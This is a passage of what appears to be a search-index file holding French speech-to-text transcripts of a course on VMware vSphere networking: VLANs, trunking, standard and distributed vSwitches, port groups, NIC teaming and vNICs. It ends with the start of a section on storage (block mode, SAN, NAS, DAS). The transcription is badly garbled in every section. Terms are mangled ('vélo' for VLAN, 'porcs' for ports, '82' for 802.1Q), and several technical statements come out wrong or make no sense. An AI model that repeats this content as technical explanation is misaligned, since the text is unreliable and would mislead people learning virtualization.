tagu\u00e9 que sur un seul v\u00e9lane en mode truck le port est utilis\u00e9 pour la liaison vers d'autres commutateurs et un ensemble de v\u00e9lins vont pouvoir lui \u00eatre affect\u00e9s , voir la totalit\u00e9 des v\u00e9los utilisables .Un autre param\u00e8tre doit \u00eatre g\u00e9r\u00e9 sur un commutateur . Le marquage , le marquage peut \u00eatre actif ou inactif dans le cas d'un marquage actif , le champ tag v\u00e9lo que nous avons vu pr\u00e9c\u00e9demment va \u00eatre propag\u00e9 lorsque le trafic va sortir du commutate , c'est \u00e0 dire que le trafic sortant va \u00e9viter du tag v\u00e9lane assign\u00e9 au port du commutateur . Nous sommes toujours sur un v\u00e9lan de niveau un , c'est le marquage est inactif , alors l'action va \u00eatrede supprimer le tag v\u00e9lade . Si la trame en contient une c'est possible qu'une trame ne soit pas tagu\u00e9e .Mais si le chant , si le param\u00e8tre marquage \u00e9tait l'\u00e9tape inactif , alors le commutateur va avoir l'effet de supprimer les informations de tags . Lorsque la trame va \u00eatre utilis\u00e9e par le communicateur . Il existe \u00e9galement un v\u00e9lo dit par d\u00e9faut . En effet , aujourd'hui , beaucoup de commutateurs ne vont pas avoir de configuration sp\u00e9cifique au niveau de leur v\u00e9lo et vont simplement .Angela dit par d\u00e9faut ce v\u00e9lo par d\u00e9faut va \u00eatre comment \u00e0 la grande majeure \u00e0 la majeure partie des comutateurs et c'est le v\u00e9lan dit num\u00e9ro un .Lever l'\u00e2ne un va \u00eatre tagu\u00e9 syst\u00e9matiquement sur toutes les trames dans la totalit\u00e9 des commutateurs qu'il soit virtuel o\u00f9 physiquesans configuration toutes les trames seront tagu\u00e9es sur le v\u00e9lane num\u00e9ro un comment employer les v\u00e9lanes sur une solution de virtualisation Eh bien chaque \u00e9quipement virtuel de gestion du r\u00e9seau comme un V switch ou 1 un virtuel distribu\u00e9 des switch c'est commutateur virtuel vont avoir un param\u00e8tre d'assignation de v\u00e9lo .Certains \u00e9quipements terminaux vont \u00e9galement pouvoir utiliser la norme 802 1 et lire les tags de velan des trames qui leur sont adress\u00e9sles bless\u00e9s virtuels vont pouvoir recevoir en tag v\u00e9lation ? Attention toutefois , tous les syst\u00e8mes d'exploitation ne sont pas en capacit\u00e9 ensuite de traiter cet algue .Nous avons un exemple ici sur 1 , un virtuel standard switch .Par d\u00e9faut , ce VSS va communiquer sur le velan un , le velin par d\u00e9faut , mais il est possible d'assigner un v\u00e9lan sp\u00e9cifique \u00e0 ce commutateur virtuel dans .Secomutateur va exploiter ce v\u00e9lan et va assigner des ports virtuels \u00e0 ceux l\u00e0 .En r\u00e9sum\u00e9 , le trucing va permettre de propager la totalit\u00e9 du trafic des v\u00e9lins utilis\u00e9s sur des commutateurs physiques , vers des commutateurs virtuels et inversement. Les commutateurs virtuels vont continuer \u00e0 employer le v\u00e9lane par d\u00e9faut tant que une configuration sp\u00e9cifique ne leur sera pas appliqu\u00e9e .La norme reste la m\u00eame entre les comutateurs physiques et les commutateurs virtuels , la norme reste le 82 .  </p>"},{"location":"Virtualisation/gestion_reseau/#vsphere-standard-switch","title":"vSphere Standard Switch","text":"<p>Nous allons maintenant d\u00e9tailler plus pr\u00e9cis\u00e9ment les composants vestph\u00e8res du r\u00e9seau nous allons voir les diff\u00e9rents possibilit\u00e9s de virtualiser des trames et des paquets .Le premier \u00e9l\u00e9ment est le VSS . L'abr\u00e9viation VSS d\u00e9termine le vesper standard switch .C'est le composant central de la gestion du r\u00e9seau d'un NUSXI . Pour rappel , le SXXI est l'hyperviseur de V moins . C'est .Cl\u00e9ment qui va permettre de relier les massines virtuelles au r\u00e9seau physique connect\u00e9 \u00e0 l'autre de virtualisation le ?Laisse faire standard switch va \u00eatre g\u00e9r\u00e9 sur chaque hyperviseur en fonction des connexions disponibles sur cette hyperviseur .Dans le cadre d'une solution de gestion globale de type V Center , le V Center sera capable de d'administrer chaque VSS de chaque hyperviseur. 1 va \u00eatre li\u00e9 \u00e0 un ou plusieurs groupements de port . En effet , un vesver standard switch et la repr\u00e9sentation virtuelle , strictement identique \u00e0 un commutateur physique .Le VSS est un \u00e9l\u00e9ment de commutation de r\u00e9seau qui .Qui va avoir les m\u00eames fonctionnalit\u00e9s qu'un commutateur physique ?Cev\u00e9e 16 va pouvoir \u00eatre nomm\u00e9. On va retrouver \u00e0 l'int\u00e9rieur un groupement de porcs . Ce groupement de bons va permettre la liaison ou machine virtuelle .Chaque machine virtuelle disposant d'une ou de plusieurs cartes r\u00e9seau va venir se connecter \u00e0 un groupement de portes pr\u00e9sent sur 1 sph\u00e8re standard switch de la m\u00eame .De la m\u00eame mani\u00e8re qu'un terminal se connecte \u00e0 un port sur un communisateur physique .Le VSS comporte donc diff\u00e9rents groupes d'import permettant aux machines virtuelles de se raccorder et d'acc\u00e9der au raisin .1 16 va \u00e9galement supporter des groupements de ports de type VM Carmen, c'est groupement de temps que nous d\u00e9taillerons plus loin , vont h\u00e9berger des services propres \u00e0 l'hyperviseur comme l'h\u00e9bergement de l'interface web d'administration . Enfin , 1 va \u00eatre raccord\u00e9 \u00e0 une aux cartes r\u00e9seau physique de l'autre 2 virtualisation. 1 16 peut \u00eatre raccord\u00e9 \u00e0 une ou plusieurs cartes r\u00e9seau . En effet , tr\u00e8s souvent pour assurer la tol\u00e9rance de panne , l'acc\u00e8s au r\u00e9seau va se faire sur plusieurs cartes r\u00e9seaux pour couvrir la d\u00e9faillance de l'une ou l'autre de ces cartes r\u00e9seau. En r\u00e9sum\u00e9 1 va avoir 2 parties . Il joue le r\u00f4le d'interface entre le r\u00e9seau physique et le r\u00e9seau virtuel .  </p>"},{"location":"Virtualisation/gestion_reseau/#vswitch-distribue","title":"vSwitch distribu\u00e9","text":"<p>\u00c0 la diff\u00e9rence du vssper standard switch qui est li\u00e9 \u00e0 1 nous allons retrouver dans les solutions de gestion globale de VM ware le VDS pour le V sph\u00e8re distribuedate switch ?Diff\u00e9rence majeure entre les 2 et dans le fait qu'un VDS ne sera li\u00e9 \u00e0 aucun hyperviseuren effet nous avons vu pr\u00e9c\u00e9demment que des fonctionnalit\u00e9s de la vesp\u00e8re permettaient de d\u00e9placer une machine virtuelle d'un hyperviseur vers un autre hyperviseur sans pertede connexion au r\u00e9seau pour cela le pr\u00e9requis va \u00eatre que la machine virtuelle a d\u00e9plac\u00e9 ne soit pas raccord\u00e9 sur 1 qui apporterait une d\u00e9pendance par rapport au r\u00e9seau connect\u00e9 \u00e0 l'hyperviseur il soit reli\u00e9 sur 1ce VDS va \u00eatre reli\u00e9 sur la totalit\u00e9 des hyperviseurs de l'ensemble de virtualisation ?Propri\u00e9t\u00e9 va lui permettre d'assurer en permanence la connectivit\u00e9 au r\u00e9seau physique et .Ajouter une tol\u00e9rance de panne en cas de perte d'un hyperviseur .Le VDS est utilisable sur la totalit\u00e9 des autres ou sur un groupe d'h\u00f4tes sp\u00e9cifiques. En effet , lorsque nous allons cr\u00e9er ce VDS , nous allons choisir les autres et \u00e9galement les cartes r\u00e9seau physique que nous avons que nous allons li\u00e9es \u00e0 ce niveau. Le VDS ne va pas \u00eatre pr\u00e9sent physiquement sur aucun hyperviseur . Il sera d\u00e9clar\u00e9 au sein du V Center le .Le V Center , qui est l'\u00e9l\u00e9ment de contr\u00f4le global va assurer les liaisons entre les hyperviseurs et le VDS .L'emploi d'un VDS doit se faire avec un niveau , un nombre minimum d'hyperviseur .La fonctionnalit\u00e9 virtuelle distribut\u00e9e de switch est disponible \u00e0 partir de la licence entreprises plus .  </p>"},{"location":"Virtualisation/gestion_reseau/#les-groupements-de-ports","title":"Les Groupements de ports","text":"<p>Bien rendu un veste switch standard peut h\u00e9berger 2 types de groupements de porcs ces groupements de porc sont comparables au port disponible sur un commutateur physiqueun commutateur virtuel peut h\u00e9berger des ports disponibles pour les machines virtuelles dans ce cas l\u00e0 ce type de groupement de porc sera un type VM Network sur ce type de groupement de porc seuls les VM peuvent \u00eatre reli\u00e9scela va permettre aux machines virtuelles de communiquer entre elles mais \u00e9galement de b\u00e9n\u00e9ficier des liaisons montantes soient des cartes r\u00e9seau de la machine haute attribu\u00e9e au vest switch h\u00e9bergeant le groupe vent de porc et de b\u00e9n\u00e9ficier des services disponibles sur ce r\u00e9seauun vais switch standard peut h\u00e9berger plusieurs groupements de porcs de type VM Networkces groupements de bord ces ronds clairement distincts et les machines virtuelles connect\u00e9es sur chacun des groupements de porcs ne pourront pas communiquer avec d'autres machines virtuelles h\u00e9berg\u00e9es sur d'autres groupements de porcs m\u00eame si celle ci sont sur le m\u00eame V switch il est .Tellement possible de segmenter les vers switch et les groupements de porc en rajoutant le tag v\u00e9lo sur chaque groupement de porc dans ce cas l\u00e0 chaque machine fonctionnera sur un seul velan le v\u00e9lan attribu\u00e9 au groupement de temps le feu .Le 2 type de groupe Menton et le VM Kernel , il ne permet pas d'\u00eatre assign\u00e9 \u00e0 une nation virtuelle . Il va servir uniquement pour h\u00e9berger des services disponibles sur l'hyperviseur. On essaie l'hyperviseur a besoin de services renseign\u00e9s par une adresse IP pour pouvoir communiquer avec ou l'u V Center ou d'autres hyperviseurs ou autres solutions comprises dans l'infrastructure .Pour cela , groupement de formes de type VM carnel va \u00eatre disponible sur un V switch veut b\u00e9n\u00e9ficier d'une adresse IP et \u00e9galement d'un service sp\u00e9cifique .En r\u00e9sum\u00e9 , un V switch peut \u00eatre connect\u00e9 sur plusieurs cartes r\u00e9seau ou aucune . On peut cr\u00e9er des V switch pour isoler et faire communiquer les machines virtuelles entre elles dans la vie sph\u00e8re . Le V switch peut \u00e0 la fois h\u00e9berger d\u00e9groupement de port de team VM Network et des groupements de porcs de team VM Canada .  </p>"},{"location":"Virtualisation/gestion_reseau/#vmnic-ou-pnic","title":"VMNIC ou pNIC","text":"<p>Les VMNIC et les PNIC sont 2 appellations qui d\u00e9signent le m\u00eame objet en effet ces appellations d\u00e9signent les cartes r\u00e9seaux physiques li\u00e9es aux h\u00f4tes de virtualisation les abr\u00e9viations sont diff\u00e9rentes car elles d\u00e9signent le m\u00eame objet d'un c\u00f4t\u00e9 ou de l'autre de la vaisselle on est ?Et on parlera de PNIC pour physical Network integrated card lorsque l'on parle de la carte r\u00e9seau physique de l'autre mais cette carte r\u00e9seau physique va \u00eatre interpr\u00e9t\u00e9e comme une VM et lyc\u00e9e V .Tu as le m\u00e9dia Network int\u00e9grated card lorsque on retrouve l'objet \u00e0 l'int\u00e9rieur de la vaisselle en .Les VMNIC vont \u00eatre les \u00e9l\u00e9ments qui vont permettre aux vais switch standard de pouvoir communiquer avec le r\u00e9seau physique ?Attention le .Dommage DVMIC commence par la carte num\u00e9ro 0 cette carte num\u00e9ro 0 la VMNIC 0 indique la carte r\u00e9seau physique num\u00e9ro une 2 loute et ainsi de suite .Est importante bien diff\u00e9renci\u00e9e les 2 lavez munissez comporte la m\u00eame adresse Mac que la PMIC si la segmentation v\u00e9lane a \u00e9t\u00e9 indiqu\u00e9e sur la carte r\u00e9seau physique il faut \u00e9galement reproduire la carte l'adressage la configuration v\u00e9lane sur la VMNIC .Chaque carte est li\u00e9e \u00e0 un seul V switch un V switch peut \u00eatre li\u00e9 \u00e0 plusieurs cartes mais une carte ne pourrait \u00eatre rien qu'\u00e0 un seul vSwitch.  </p>"},{"location":"Virtualisation/gestion_reseau/#le-regroupement-de-carte-reseau-teaming","title":"Le regroupement de carte r\u00e9seau (Teaming)","text":"<p>Timing et la d\u00e9nomination pour le regroupement de cartes en effet dans une solution de virtualisation de serveur un \u00e9l\u00e9ment important et la consolidation il est important d'avoirun secours en cas de panne soit d'un autre soit d'un \u00e9l\u00e9ment d'un autre pour secourir la connexion au r\u00e9seau une des solutions est d'utiliser le timing le timing et le regroupement de plusieurs cartes r\u00e9seau physiques en un seul objet logique .Ce regroupement peut \u00eatre accompagn\u00e9 d'une strat\u00e9gie 2 strat\u00e9gies sont possibles le premier et le d\u00e9bit cumul\u00e9 dans ce cas l\u00e0 2 cartes r\u00e9seaux minimum sont n\u00e9cessaires ces 2 cartes r\u00e9seau vont voir leur d\u00e9bit cumul\u00e9 pour permettre un d\u00e9bit plus important et ainsi fournir plus de services ou machines virtuelles ou \u00e0 l'hyperviseur en fonction du besoinles pr\u00e9requis vont \u00eatre un mode de configuration en mode actif actif chaque carte r\u00e9seau sera active dans le teaming l'inconv\u00e9nient de cette solution c'est qu'en cas de d\u00e9faillance d'une des 2 cartes le d\u00e9bit sera r\u00e9duit de la moiti\u00e9 .La 2 strat\u00e9gie est d'utiliser ces 2 cartes en tol\u00e9rance de panne ou faillover dans cette strat\u00e9gie le mode est actif passif ou passif actif selon le besoin et la carte r\u00e9seau passive prendra le relais de la carte r\u00e9seau active en cas de d\u00e9faillance de celle ci les avantages sont un secours en cas de d\u00e9faillance et un secours qui se fera de mani\u00e8re automatique l'inconv\u00e9nient et la mise en \u00e9tat passif d'une carte r\u00e9seau cette carte r\u00e9seau n'est donc pas d'utilit\u00e9 \u00e0 part de remplacer la carte r\u00e9seau active ?Rocky sont de disposer d'au moins 2 raccord\u00e9s sur 1 switch standard .Sa mise en \u0153uvre peut se faire soit on s\u00e9lectionnant les 2 cartes au moment de la cr\u00e9ation du switcho virtuel ou par l'ajout plus tard d'une nouvelle liaison montante un switch Virtuel puis \u00e0 la cr\u00e9ation du timing et au choix de la strat\u00e9gie d\u00e9bicut\u00e9e ou tol\u00e9rance de Paris . La r\u00e9partition de charge \u00e0 l'int\u00e9rieur du timing lorsque l'on choisit une strat\u00e9gie de type d\u00e9bit cumul\u00e9 , peut \u00e9galement \u00eatre modifi\u00e9 par d\u00e9faut . La r\u00e9partition de charges se fera en .Type best effort c'est \u00e0 dire que chaque demande soit satisfaite le plus rapidement possible mais il est \u00e9galement possible de modifier cette attribution du d\u00e9bit la .La solution est d'attribuer par VN en effet une VM \u00e9tant raccord\u00e9e \u00e0 un port d'un groupement de port d'un vais switch on peut favoriser le port du groupement de port sollicit\u00e9 par cette VM et lui donner une priorit\u00e9 sur l'acc\u00e8sil est \u00e9galement possible lorsqu'on ne souhaite pas privil\u00e9gier la totalit\u00e9 d'import il est possible de privil\u00e9gier une adresse Mac dansHein lorsque le groupe mon port aura une demande de l'adresse Mac cible Eh bien ces demandes seront satisfaites en priorit\u00e9 il est enfin possible de g\u00e9rer les ressources par paquet cette fois ci en fonction de l'adressage source et destination un algorithme va d\u00e9terminer la carte r\u00e9seau la plus proche et va d\u00e9terminer l'utilisation de celle ci en fonction de la destination \u00e0 atteindrecette strat\u00e9gie s'appelle le voisinage on va tenter de r\u00e9soudre la demande de la machine virtuelle par rapport au r\u00e9seau le plus proche de celle ci .Il est \u00e9galement possible de faire de l'ordonnancement de cartes .La d\u00e9faillance d'une carte entra\u00eenera la r\u00e9partition de charge sur la carte restante .  </p>"},{"location":"Virtualisation/gestion_reseau/#vnic","title":"vNIC","text":"<p>Puis c'est d\u00e9signe les virtuels Network insigrat car ce sont les cartes r\u00e9seau int\u00e9gr\u00e9es directement aux machines virtuellesces cartes r\u00e9seau peuvent \u00eatre unique ou multiples en fonction des besoins de la machine virtuelleen effet une VNIC va \u00eatre raccord\u00e9e \u00e0 un ou plusieurs groupements de porcs en fonction du groupement de porc sur lequel elle va \u00eatre reli\u00e9e elle va pouvoir b\u00e9n\u00e9ficier d'un acc\u00e8s aux fonctionnalit\u00e9s mises \u00e0 disposition par le V switch elle pourra \u00eatre segment\u00e9e par l'utilisation des v\u00e9lanes indiqu\u00e9es sur le groupe montantelle pourra \u00e9galement servir de faillover en cas de d\u00e9faillance d'une carte r\u00e9seau sur la machine virtuelle plusieurs topologies sont possibles .Et c'est il est important de les r\u00e9partir correctement sur la machine virtuelle car un autre va disposer d'un ensemble de cartes r\u00e9seau ces cartes r\u00e9seau vont fournir diff\u00e9rents services en fonction de leurs liens avec des commutateurs physiquesles besoins du r\u00e9seau vont \u00eatre le r\u00e9seau pour les machines virtuelles le r\u00e9seau de gestion de l'infrastructure le r\u00e9seau de d\u00e9placement de machines virtuelles entre les autresle flux il s'est ici pour une solution de stockage externe et le .Ce que la fonctionnalit\u00e9 est disponible dans la veste faire l'utilisation de tr\u00e8s haute disponibilit\u00e9 type folklance .Il est important de bien recenser les besoins pour identifier ce que l'on souhaite regrouper et ceux que l'on souhaite isoler . En effet , avec les fonctionnalit\u00e9s vues pr\u00e9c\u00e9demment de timing de r\u00e9partition de charges de V switch . On va pouvoir d\u00e9terminer des acc\u00e8s communs . D'un autre exemple ici , le r\u00e9seau \u00e0 disposition des machines virtuelles passera par un flux d\u00e9di\u00e9 . Ce flux .Sera prot\u00e9g\u00e9 pour \u00e9viter d'exposer les machines virtuelles au danger de l'internet . Ce flux ne pourra pas \u00eatre regroup\u00e9 avec d'autres flux .Le flux de gestion de l'infrastructure , donc d'acc\u00e8s \u00e0 l'interface web et \u00e9galement de d\u00e9placement de machines virtuelles ne doit pas croiser le r\u00e9seau \u00e0 disposition pour les machines virtuelles . Ce flux est un flux d'administration , il est peu sollicit\u00e9 , donc les cartes r\u00e9seau qui participent \u00e0 ce flux pourront \u00eatre communes .Enfin , le flux ISCSI va \u00eatre d\u00e9di\u00e9 dans un mode que l'on appelle un mode trunk comme l'on a vu pr\u00e9c\u00e9demment et ce lien va \u00eatre unique entre .Entre notre h\u00f4te et la solution de stockage externe . En effet , le protocole IS , c'est ici que nous verrons dans un autre module , va \u00eatre un protocole de stockage en r\u00e9seau et utilise des fonctionnalit\u00e9s de r\u00e9seau de stockage .Ce r\u00e9seau ne doit pas \u00eatre m\u00e9lang\u00e9 avec le r\u00e9seau de gestion ou le r\u00e9seau de d\u00e9placement du VN ou le r\u00e9seau destination DVMEn r\u00e9sum\u00e9 nous avons ici des VM et lyc\u00e9es nous voyons ici que la VMNIC un et la VMNIC 2 peut couvrir le .Zoo \u00e0 disposition des VM l'emploi d'une strat\u00e9gie de type teaming avec de la tol\u00e9rance de panne peut \u00eatre importante pour garantir un acc\u00e8s constant aux machines virtuelles .Puis la carte r\u00e9seau VMI 73 peut inversement couvrir 2 besoins . Le besoin en gestion de l'infrastructure et le besoin des placements de VM quand la .Quant \u00e0 la carte r\u00e9seau VMI c'est 4 , elle sera totalement d\u00e9di\u00e9e ou flux de stockage ISCSI .En r\u00e9sum\u00e9 , nous avons ici un h\u00f4te qui est raccord\u00e9 gr\u00e2ce \u00e0 2 commutateurs physiques SW un et SW 2commutateur vont permettre \u00e0 l'h\u00f4te \u00e0 la fois de donner l'acc\u00e8s au r\u00e9seau externe \u00e0 ces messine virtuelles donc . Donc par l'interm\u00e9diaire de la VMNIC 0 et de la VM\u00c9IC 1 ces 2 cartes r\u00e9seau physique vont \u00eatre reli\u00e9es sur le V switch 0 ce v switch 0 dispose d'un groupement de corps de type VM prod ce groupement de pommes et de types VM Network . Il est \u00e0 disposition des machines virtuelles h\u00e9berg\u00e9es sur cette h\u00f4te . Ce veswich disposant de 2 liaisons montantes . Il est possible de mettre en place du timing puis .Strat\u00e9gie de fail over et de garantir qu'en cas de perte d'une des 2 cartes r\u00e9seau soit la V \u00e9min\u00e9e c'est 0 soit la V \u00e9municaire les machines virtuelles auront un acc\u00e8s continu aux r\u00e9seaux externes .Puis c'est tout dispose \u00e9galement de la VMI c 2 et de la VMI c 3 . Ces 2 cartes r\u00e9seau participent en tant que liaison montante au Veswitz , un . Ce verset un dispose d'un groupement de corps de type VMTRnel pour le service de gestion et \u00e9galement d'un groupement de ports de type VM carnel pour la fonctionnalit\u00e9 de Vemotion , fonctionnalit\u00e9 permettant de d\u00e9placer des machines virtuelles d'un autre vers un autre h\u00f4te . Encore une fois , 2 cartes \u00e9tant pr\u00e9sentes , le timing est disponible . La strat\u00e9gie de faillover est applicable .Dans ce cas l\u00e0 , on ne perdra jamais l'acc\u00e8s \u00e0 la console de gestion puisque le service de gestion \u00e9tant h\u00e9berg\u00e9 sur un vaisseau disposant de 2 liaisons montantes dans le cadre de d'une perte d'une 2 cartes , l'acc\u00e8s \u00e0 l'interface de gestion sera toujours possible par l'autre carte .Puis enfin la carte r\u00e9seau , la VMNISE 4 et la VMNISS 5 vont participer exclusivement au V switcher 2 ce V switch 2 dispose d'un groupement de porcs de type VM Carmen et h\u00e9berge de service de stockage .Ce service de stockage est uniquement reli\u00e9 \u00e0 un commutateur de stockage ce commutateur n'a aucun lien avec aucun autre commutateur physique et ce commutateur est uniquement reli\u00e9 \u00e0 une baie de stockage de disque cette belle de stockage de disque peut \u00eatre une baie de type San ou de type NAS les protocoles d'\u00e9change de fichiers ou de blocs par r\u00e9seau vont uniquement employer ce r\u00e9seau de stockage .Carte r\u00e9seau \u00e9tant \u00e9galement disponible nous pouvons choisir soit de cumuler le d\u00e9bit des 2 cartes pour augmenter les performances ou d'appliquer une strat\u00e9gie de fail over .R\u00e9sum\u00e9 un ao\u00fbt va \u00eatre compos\u00e9 de diff\u00e9rentes piaisons chaque liaison va avoir un r\u00f4le pr\u00e9cis au sein de la solution de virtualisation afin d'apporter soit des performances sup\u00e9rieures soit un secours en cas de d\u00e9faillance .  </p>"},{"location":"Virtualisation/gestion_reseau/#vlan-en-environnement-virtualise","title":"VLAN en environnement virtualis\u00e9","text":"<p>Nous avons vu au tout d\u00e9but de ce module le fonctionnement des apr\u00e8s avoir d\u00e9taill\u00e9 l'ensemble des fonctionnalit\u00e9s r\u00e9seau dans une des sph\u00e8res nous allons voir l'application des v\u00e9lanes dans cet environnement virtualis\u00e9 .Levelum peuvent \u00eatre infect\u00e9s \u00e0 tout niveau sur tous les \u00e9l\u00e9ments r\u00e9seaux d'une vestph\u00e8re . En effet , on peut r\u00e9server un vers switch . \u00c0 l'utilisation d'un seul et unique vella .Dans ce cas l\u00e0 , tout le trafic tel que soient les groupements de ports utilis\u00e9s sera tagu\u00e9 sur ce Vladian .Il faut faire attention tout de m\u00eame puisque la liaison montante la VMNIC attribu\u00e9e \u00e0 ce vers switch devra \u00e9galement permettre la communication sur ce V\u00e9lane . Il est possible d'assigner plusieurs v\u00e9lanes dans ce cas l\u00e0 , la liaison montante devra \u00eatre configur\u00e9e en mode trunk .Il est possible d'assigner \u00e0 un groupement de corps un v\u00e9lane . Dans ce cas l\u00e0 , seules les machines virtuelles reli\u00e9es \u00e0 ce compoint de port utiliseront le v\u00e9lan , attribut .Il est enfin possible d'attribuer des v\u00e9lanes sur les VNIC , les cartes r\u00e9seau virtuelles des machines virtuelles . Attention tout de m\u00eame , il faudra configurer la prison du charge du protocole 800 de vaincu sur le syst\u00e8me d'exploitation utilis\u00e9 sur la machine virtuelle .Silverland sont affect\u00e9s par l'hyperviseur , le Vichy doit \u00eatre configur\u00e9 en mode trunk , donc du c\u00f4t\u00e9 physique .Lorsqu'un v\u00e9lan est utilis\u00e9 dans la partie virtuelle et bien le lien vers le commutateur physique doit \u00eatre un lien de titres trunk . En effet , ce lien va devoir supporter .Un \u00e0 plusieurs v\u00e9lanes et doit permettre le transport de toutes les trames de la partie virtuelle vers la partie physique .</p>"},{"location":"Virtualisation/gestion_stockage/","title":"Gestion stockage","text":""},{"location":"Virtualisation/gestion_stockage/#solution-de-stockage","title":"Solution de Stockage","text":"<p>Le stockage est un \u00e9l\u00e9ment important dans une solution de virtualisation car en effet si le syst\u00e8me de stockage n'est pas soit correctement dimensionn\u00e9 pour l'ensemble des machines virtuelles ou si ce syst\u00e8me de stockage ne propose pas de performance suffisante Eh bien la solution de virtualisation ne fonctionnera pas de mani\u00e8re optimale nous allons donc voir ici les diff\u00e9rentes solutions les diff\u00e9rents syst\u00e8mes qui peuvent \u00eatre mis \u00e0 disposition et int\u00e9grer dans une solution de stockage afin de r\u00e9pondre aux ?Moins des diff\u00e9rents types de massifs virtuels et de fonctionnalit\u00e9s de la solution de stockagenous allons donc d\u00e9finir 3 th\u00e8mes importants le premier \u00e9tant le mode bloc en effet dans le monde de l'informatique il est possible d'\u00e9changer des informations selon 2 types pr\u00e9cis le premier est le type de fichier o\u00f9 .Donn\u00e9es va \u00eatre contenu dans un fichier ces fichiers vont ensuite \u00eatre stock\u00e9s sur des m\u00e9dias de stockage comme un disque dur de la m\u00e9moire flash un lecteur optique dans une solution de virtualisation l'acc\u00e8s \u00e0 ces fichiers est tr\u00e8s long et surtout le nombre de fichiers est cons\u00e9quent pour pouvoir apporter de meilleures performances dans une solution de virtualisation on va modifier cet acc\u00e8s et passer sur un mode bloc .En mode bloc chaque donn\u00e9e va \u00eatre transport\u00e9e dans un bloc de donn\u00e9es ces blocs vont \u00eatre toqu\u00e9s sur l'emplacement de stockage cet emplacement de stockage et la plupart du temps un n'est pas n'est pas un simple disque dur mais un ensemble de disque dur .Ces blocs de donn\u00e9es sont un identifiant unique cet identifiant unique va permettre de rep\u00e9rer . Rep\u00e9rer et de savoir \u00e0 quel endroit pr\u00e9cis le bloc de donn\u00e9es va se situer le .Le syst\u00e8me de stockage quant \u00e0 lui va savoir au moment o\u00f9 la solution de virtualisation va avoir besoin de cet \u00e9l\u00e9ment , aller le chercher gr\u00e2ce \u00e0 son identifiant .Ces blocs vont parfois transiter dans un r\u00e9seau de stockage . Ce serait r\u00e9seau de stockage ou \u00e9galement appel\u00e9 San Storyge area Network est un r\u00e9seau d\u00e9di\u00e9 ou transit d\u00e9bloque de donn\u00e9es . En effet , ces blocs de donn\u00e9es ne vont pas rester sur l'un ou l'autre des hyperviseurs qui constituent la solution de stockage . Ces blocs de donn\u00e9es vont \u00eatre transport\u00e9s dans un .Dans un r\u00e9seau d\u00e9di\u00e9 au stockage , c'est r\u00e9soudre d\u00e9di\u00e9 au stockage interconnecte des \u00e9l\u00e9ments sp\u00e9cifiques capables de travailler avec des protocoles de stockage , 2 blocs , 2 donn\u00e9es .Le San est un \u00e9l\u00e9ment ind\u00e9pendant d'un hyperviseur . Il est constitu\u00e9 d'un ensemble de supports de stockage , soit des disques m\u00e9caniques , soit des disques solides , soit un hybride entre disques solides et disques m\u00e9caniques , mais le plus important est que cet \u00e9l\u00e9ment soit autonome par rapport \u00e0 la solution de virtualisation . Cet \u00e9l\u00e9ment est ensuite reli\u00e9 par l'interm\u00e9diaire des V switch comme nous l'avons vu pr\u00e9c\u00e9demmentqui vont me permettre \u00e0 la solution de virtualisation d'acc\u00e9der \u00e0 la solution de stockage en utilisant un r\u00e9seau d\u00e9lit .Et enfin le NAS pour Network attach\u00e9 historique est \u00e9galement un \u00e9l\u00e9ment de stockage autonome . Il est situ\u00e9 en dehors de la solution de virtualisation . Il est reli\u00e9 par un r\u00e9seau , mais ce r\u00e9seau n'est pas obligatoirement un r\u00e9seau de stockage d\u00e9di\u00e9 et les protocoles d'\u00e9changes de donn\u00e9es entre la solution de de virtualisation et le p\u00e9riph\u00e9rique de type NAS ne seront pas des protocoles d'\u00e9change de blocs de donn\u00e9es, mais des protocoles d'\u00e9change de fichiers . Comment retrouve par exemple un le SMB ou le NSS ? En effet , ce sont 2 protocoles de partage et d'\u00e9change d'affich\u00e9s . L'avantage du partage de fichiers et que l'on va pouvoir les faire transiter de mani\u00e8re s\u00e9curis\u00e9e , notamment \u00e0 travers l'internet , ce qui est beaucoup plus risqu\u00e9 avec des blocs de donn\u00e9es au niveau d'un stockage de type Samchaque solution va avoir son avantage et ses inconv\u00e9nients . Nous d\u00e9taillerons plus tard les solutions saines et les solutions nasses .Une infrastructure va regrouper un ensemble de services lorsqu'elle est virtuelle , chaque service va avoir une sp\u00e9cificit\u00e9 et un besoin de stockage .Nous avons par exemple ici un service qui va avoir besoin d'une donn\u00e9e ce .Liste pour obtenir cela donner et bien va cr\u00e9er une requ\u00eate \u00e0 partir de 200 besoins cette requ\u00eate va \u00eatre n\u00e9cessaire pour obtenir le contenu le contenu \u00e9tant la donn\u00e9e \u00e0 obtenir pour cela l'utilisateur va saisir une suite de commande qui va \u00eatre g\u00e9n\u00e9r\u00e9e dans une requ\u00eate et qui va s'adresser \u00e0 un service ce service va ensuite consulter ses donn\u00e9es et par rapport \u00e0 la requ\u00eate g\u00e9n\u00e9r\u00e9e \u00e0 tenter de ?Retrouver la donn\u00e9e et la renvoyer sous forme d'une r\u00e9ponse \u00e0 l'utilisateur qui en a fait la demande et bien dans une solution de virtualisationla solution de stockage va en permanence \u00eatre sollicit\u00e9e par des requ\u00eates \u00e9manantes des machines virtuelles et va \u00e0 la fois stocker des donn\u00e9es mais \u00e9galement lire des donn\u00e9es et les rendre \u00e0 disposition des machines virtuelles ?Mais les donn\u00e9es sont au c\u0153ur du fonctionnement de chaque service et les services sont au c\u0153ur des infrastructures r\u00e9seau .Dans la plupart des cas , une machine va disposer d'un p\u00e9riph\u00e9rique de stockage local , \u00e7a peut \u00eatre le cas des serveurs de virtualisation dans ce cas l\u00e0 , les autres vont mettre \u00e0 disposition les p\u00e9riph\u00e9riques de stockage connect\u00e9s directement sur les machines hautes . On parle dans ces cas l\u00e0 du stockage d'ASSE pour direct attacher Store age .Dans ce cas l\u00e0 , l'acc\u00e8s aux donn\u00e9es va \u00eatre li\u00e9 \u00e0 la connectique . En effet , sur un serveur , nous avons l'habitude de retrouver une connective , une connectique , une connectique de type SAS .Cette connectique est d\u00e9di\u00e9e au serveur , elle va permettre une meilleure performance sur l'acc\u00e8s aux donn\u00e9es sur un ordinateur classique . Nous allons retrouver un stockage de type satin les performances seront moins seront moins bonnes que sur un serveur de virtualisation . Mais le principe va \u00eatre le m\u00eame . La solution de virtualisation va utiliser un protocole .Et entre l'ao\u00fbt et le p\u00e9riph\u00e9rique entre le support de stockage et l'ordinateur . Eh bien , il y aura un protocole de stockage , il sait ici SAS , un mode d'acc\u00e8s , lecture o\u00f9 \u00e9criture et une connectique c\u00e2ble . La plupart du temps .Ces 3 \u00e9l\u00e9ments sont li\u00e9s entre eux , c'est \u00e0 dire que un ordinateur doit pouvoir utiliser un p\u00e9riph\u00e9rique de stockage 